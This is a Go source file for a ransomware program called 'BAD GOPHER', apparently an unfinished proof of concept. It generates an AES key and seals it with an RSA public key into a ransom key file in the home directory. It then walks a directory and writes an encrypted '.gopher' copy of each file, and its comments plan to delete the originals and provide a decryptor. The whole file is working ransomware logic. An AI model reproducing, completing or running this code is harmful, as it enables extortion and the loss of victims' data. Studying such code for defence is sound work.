package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/x509"
	"encoding/hex"
	"encoding/pem"
	"fmt"
	"io"
	"io/ioutil"
	"os"
	"path/filepath"
	"strings"
	"time"
)

// CSPRNG random byte generator
func generateRandomBytes(n int) ([]byte, error) {
	b := make([]byte, n)
	_, err := rand.Read(b)

	if err != nil {
		return nil, err
	}

	return b, nil
}

func encrypt(data []byte, key []byte) []byte {
	block, _ := aes.NewCipher(key)
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		panic(err.Error())
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err = io.ReadFull(rand.Reader, nonce); err != nil {
		panic(err.Error())
	}
	ciphertext := gcm.Seal(nonce, nonce, data, nil)
	return ciphertext
}

func decrypt(data []byte, key []byte) []byte {
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err.Error())
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		panic(err.Error())
	}
	nonceSize := gcm.NonceSize()
	nonce, ciphertext := data[:nonceSize], data[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil {
		panic(err.Error())
	}
	return plaintext
}

func encryptFile(inputFilename string, outputFilename string, key []byte) {
	// TODO: If possible, encrypt file in place
	// or copy metadata to file
	// or zip file first to preserve metadata (turn off compression)

	inputFile, _ := ioutil.ReadFile(inputFilename)
	f, _ := os.Create(outputFilename)
	defer f.Close()
	f.Write(encrypt(inputFile, key))
}

func decryptFile(filename string, key []byte) []byte {
	data, _ := ioutil.ReadFile(filename)
	return decrypt(data, key)
}

func main() {
	// TODO: Add command-line arguments for decryption to recover files
	// Another idea: separate user-friendly binary for decrypting with easy to
	// use CLI. Store in this binary with https://github.com/markbates/pkger and
	// extract onto the user's desktop when done.

	magicBytes := []byte("BAD GOPHER\n")
	currentTime := []byte(time.Now().UTC().String() + "\n")
	// decryptPtr := flag.Bool("decrypt", false, "decrypt with given key")

	// Generate the symmetric AES encryption key
	key, _ := generateRandomBytes(32)

	fmt.Printf("Symmetric key: %s\n", hex.EncodeToString(key))

	pubRaw, _ := ioutil.ReadFile("pub.pem")
	pubPem, _ := pem.Decode(pubRaw)
	pubKey, _ := x509.ParsePKCS1PublicKey(pubPem.Bytes)

	// privRaw, _ := ioutil.ReadFile("priv.pem")
	// privPem, _ := pem.Decode(privRaw)
	// privKey, _ := x509.ParsePKCS1PrivateKey(privPem.Bytes)

	// Encrypt the symmetric key with the asymmetric public key
	ciphertext, _ := rsa.EncryptOAEP(sha256.New(), rand.Reader, pubKey, append(append(magicBytes, currentTime...), key...), nil)

	home, _ := os.UserHomeDir()
	keyFilePath := home + "/BAD_GOPHER.txt"

	// Check if key file exists, if so exit program b/c already encrypted
	if _, err := os.Stat(keyFilePath); err == nil {
		fmt.Printf("Key file exists, exiting")
		return
	}

	// Save the decryption key and other information to the disk
	keyFile, _ := os.Create(keyFilePath)
	keyFile.WriteString(hex.EncodeToString(ciphertext))
	keyFile.Close()

	fmt.Printf("Ciphertext: %s\n", hex.EncodeToString(ciphertext))
	// plaintext, _ := rsa.DecryptOAEP(sha256.New(), rand.Reader, privKey, ciphertext, nil)
	// fmt.Printf("Plaintext: %s\n", plaintext)

	const suffix = ".gopher"
	const startingDirectory = "testdir/"

	// Go through every file in the starting directory and encrypt it
	filepath.Walk(startingDirectory, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		// Don't encrypt directories
		if info.IsDir() {
			return nil
		}

		// Don't encrypt large files (>2GB)
		if info.Size() > 2000000000 {
			return nil
		}

		// Don't encrypt already encrypted files
		if strings.HasSuffix(info.Name(), suffix) {
			return nil
		}

		// Don't encrypt files that have already been encrypted
		if _, err := os.Stat(path + suffix); err == nil {
			return nil
		}

		// Don't encrypt the decryption key file
		if strings.Contains(info.Name(), "BAD_GOPHER.txt") {
			return nil
		}

		fmt.Println(path, info.Size())
		encryptFile(path, path+".gopher", key)
		// TODO: destroy original file
		return nil
	})
}
